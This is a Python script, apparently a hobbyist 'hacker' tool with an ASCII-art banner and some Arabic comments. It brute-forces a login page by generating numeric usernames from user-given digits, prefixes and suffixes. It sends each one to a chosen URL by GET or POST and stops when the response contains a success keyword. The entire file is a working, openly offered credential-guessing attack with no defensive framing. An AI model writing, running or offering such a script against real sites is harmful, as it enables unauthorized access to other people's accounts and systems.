import random
import requests
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# طباعة ببطء مع لون
def slow_print(lines, color=Fore.WHITE, delay=0.05):
    for line in lines.strip('\n').split('\n'):
        print(color + line)
        time.sleep(delay)

# Welcome message and ASCII art
def display_welcome_message():
    banner = '''
  ===========================================================
   _____  _______  _____  _______      _____     _____  
  /  __  \|__   __|/  __  \|__   __|    |  __  \   /  __  \ 
 |  |  |  |  |  | |  |  |  |  |  |  |    | |  | |   |  |  |  |
 |  |  |  |  |  | |  |  |  |  |  |  |    | |  | |   |  |  |  |
 |  |__|  |  |  | |  |__|  |  |  |  |    | |__|  |   |  |__|  |
  \_____/   |_|  |_|  \_____/   |_|    |_____/      \_____/  

  ====================================
  Tool Name: Crazy tool
  Designed by: Haker(G.Max)
  v 1.0.0
  ====================================
    '''
    ascii_art = r"""
      .-"      "-.
     /            \
    |              |
    |,  .-.  .-.  ,|
    | )(_o/  \o_)( |
    |/     /\     \|
    (_     ^^     _)
     \__|IIIIII|__/
      | \IIIIII/ |
      \          /
       `--------`
     -=[ MASKED HACKER ]=-
    """
    slow_print(banner, color=Fore.CYAN, delay=0.05)
    slow_print(ascii_art, color=Fore.YELLOW, delay=0.05)
    print(Style.RESET_ALL)

# استدعاء مرة واحدة فقط
display_welcome_message()

# Inputs
url = input(Fore.CYAN + "[?] Enter login URL: " + Style.RESET_ALL)
method = input(Fore.CYAN + "[?] Enter request method (GET or POST): " + Style.RESET_ALL).strip().upper()
fixed_start = input(Fore.CYAN + "[?] Enter fixed start (press Enter if none): " + Style.RESET_ALL)
fixed_end = input(Fore.CYAN + "[?] Enter fixed end (press Enter if none): " + Style.RESET_ALL)
digits = input(Fore.CYAN + "[?] Enter allowed digits (e.g. 123456): " + Style.RESET_ALL)
length = int(input(Fore.CYAN + "[?] Total length of the number: " + Style.RESET_ALL))
attempts = int(input(Fore.CYAN + "[?] Number of attempts to generate: " + Style.RESET_ALL))

# Success keywords input
success_keys_input = input(Fore.CYAN + "[?] Enter success keywords (comma-separated, default: status,welcome,index.html,dashboard): " + Style.RESET_ALL).strip().lower()
if not success_keys_input:
    success_keys = ["status", "welcome", "index.html", "dashboard"]
else:
    success_keys = [key.strip() for key in success_keys_input.split(",") if key.strip()]

print(Fore.YELLOW + f"[!] Using success keywords: {', '.join(success_keys)}" + Style.RESET_ALL)

# حساب عدد الخانات المتاحة للتوليد في الوسط
middle_length = length - len(fixed_start) - len(fixed_end)

# تحقق من أن الطول كافٍ
if middle_length < 0:
    print(Fore.RED + "[!] Error: Total length is too short for the given start/end parts." + Style.RESET_ALL)
    exit()

elif middle_length == 0:
    number = fixed_start + fixed_end
    print(Fore.YELLOW + "\n[!] No room for middle digits, trying only one combination..." + Style.RESET_ALL)
    numbers_to_try = [number]
else:
    unique_numbers = set()
    max_possible = len(digits) ** middle_length
    if attempts > max_possible:
        print(Fore.YELLOW + f"[!] Warning: Only {max_possible} unique combinations possible, reducing attempts..." + Style.RESET_ALL)
        attempts = max_possible

    while len(unique_numbers) < attempts:
        middle = ''.join(random.choices(digits, k=middle_length))
        number = fixed_start + middle + fixed_end
        unique_numbers.add(number)

    numbers_to_try = list(unique_numbers)

print(Fore.YELLOW + "\n[!] Starting brute-force...\n" + Style.RESET_ALL)

with requests.Session() as session:
    for number in numbers_to_try:
        data = {"username": number}
        try:
            if method == "GET":
                response = session.get(url, params=data)
            else:
                response = session.post(url, data=data)

            if any(key in response.text.lower() for key in success_keys):
                print(Fore.GREEN + f"[+] Match found: {number}" + Style.RESET_ALL)
                break
            else:
                print(Fore.RED + f"[-] Tried: {number}" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.MAGENTA + f"[!] Error occurred: {e}" + Style.RESET_ALL)
